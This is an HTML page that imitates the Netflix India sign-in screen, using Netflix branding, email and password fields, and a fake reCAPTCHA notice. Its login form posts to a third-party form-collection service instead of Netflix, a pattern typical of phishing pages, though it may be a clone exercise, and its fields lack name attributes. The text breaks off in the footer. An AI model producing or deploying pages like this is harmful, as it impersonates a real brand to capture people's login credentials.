<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">

    <!-- Bootstrap CSS -->

    <link
    rel="icon"
    href="http://pngimg.com/uploads/netflix/small/netflix_PNG15.png"/>
    <title>NETFLIX INDIA - Sign In</title>
    <link rel="stylesheet" href="./login/login.css">
  </head>
  <body>
    
    <div class="login-top">
        <img src="./img/logo.png" alt="">
    </div>

    <div class="d-flex justify-content-center align-items-center" style="width: 100vw;">
        <section class="login-box">
            <h2 class="text-white">Sign In</h2>
            <br>
            <form action="https://formspree.io/f/mqkvkyne" method="POST">
              <div class="inputs">
                  <input type="text" placeholder="Email or phone number" style="display: flex; color: rgb(162, 159, 159); width: 20.5rem;
                  background-color: rgba(0, 0, 0, 0.87); flex-direction: column;
    align-items: center; height: 3rem; border-color:rgb(162, 159, 159) ;" required/>
    <br>
                  <input type="password" placeholder="Password"  style="display: flex; color: rgb(162, 159, 159); width: 20.5rem;
                  background-color: rgba(0, 0, 0, 0.87); flex-direction: column;
    align-items: center; height: 3rem;  border-color:rgb(162, 159, 159)" required/>
               </div>
                  <br>
               
                  <div class="button">
                    <button>Sign In</button>
                  <br><br>
                  <input type="checkbox" class="form-check-input" id="exampleCheck1">
                  <label class="form-check-label text-white small-text" for="exampleCheck1">Remember Me</label>
                </div>
                
                <div class="mt-3 d-flex">
                    <img width="20px" src="././mimg/fb.png" alt="">
                    <p class="m-0 small-text text-white mx-2">Login with Facebook</p>
                </div>
                <br>
                <div class="mt-3 ">
                    <!-- <img width="20px" src="././mimg/fb.png" alt=""> -->
                    <p class="m-0  text-white"> <span style="color: rgba(212, 212, 212, 0.75);">New to Netflix?</span>  Sign up now.</p>
                    <p class="m-0 small-text text-white  mt-2"> <span style="color: rgba(212, 212, 212, 0.75);">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#"> Learn more.</a> </span> </p>
                </div>
              </form>
        </section>
        
    </div>
    <footer class="footer">
      <div class="block1">
          <span>Questiion?</span>
          <br>
          <span>Call 0800-509-417</span>
      </div>

      <div class="block2">
          <a href="">FAQ</a><br>
          <a href="">Help Center</a>
          </div>
      <div class="block3">
